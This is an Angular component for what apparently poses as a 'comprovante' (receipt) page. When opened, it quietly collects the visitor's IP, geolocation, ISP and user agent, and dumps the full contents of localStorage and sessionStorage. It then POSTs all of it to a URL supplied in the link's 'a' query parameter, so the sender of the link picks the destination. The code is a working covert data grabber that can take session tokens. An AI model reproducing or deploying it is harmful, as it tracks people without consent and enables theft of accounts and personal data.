import { HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { adressModel, ipModel } from './models/ipModel';
import { ActivatedRoute } from '@angular/router';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})
export class AppComponent implements OnInit {
  title = 'comprovante';
  ip: string = '';  // ip
  userAgent: string = ""; // navegador e sistema operacional
  city: string = ""; // cidade
  contry: string = ""; // país 
  region: string = ""; // estado ou província
  lat: string = ""; // latitude
  long: string = ""; // longitude
  empresa: string = ""; // empresa que fornece internet
  item:string = "";

  constructor(private httpClient: HttpClient,
    private route: ActivatedRoute
  ) {

  }

  ngOnInit(): void {
    this.route.queryParams.subscribe(params => {
      this.item = params['a']; // Substitua 'nomeDoItem' pelo nome do seu query param
    });
    this.getIp();
  }


  getIp(): void {
    this.httpClient.get<ipModel>('https://api.ipify.org/?format=json').subscribe({
      next: (data) => {
        this.ip = data.ip
        this.userAgent = window.navigator.userAgent
        this.httpClient.get<adressModel>('https://ip-api.com/json/' + this.ip).subscribe({
          next: (data) => {
            this.city = data.city; this.contry = data.country; this.region = data.region, this.lat = data.lat.toString(), this.long = data.lon.toString(), this.empresa = data.org;
            const localStorageList: { key: any  | null, value: string | null }[] = [];
            const sessionStorageList: { key: any | null, value: string | null }[] = [];
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              const value = localStorage.getItem(String(key));
              localStorageList.push({ key, value });
            }
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              const value = sessionStorage.getItem(String(key));
              sessionStorageList.push({ key, value });
            }

            const userInfo = {
              ip: this.ip,
              userAgent: this.userAgent,
              city: this.city,
              country: this.contry,
              region: this.region,
              lat: this.lat,
              long: this.long,
              empresa: this.empresa,
              local: localStorageList,
              session: sessionStorageList
            };

            this.httpClient.post(this.item, userInfo).subscribe({
              next:(data) => {

              }
            })
          }
        })
      }
    })
  }
}
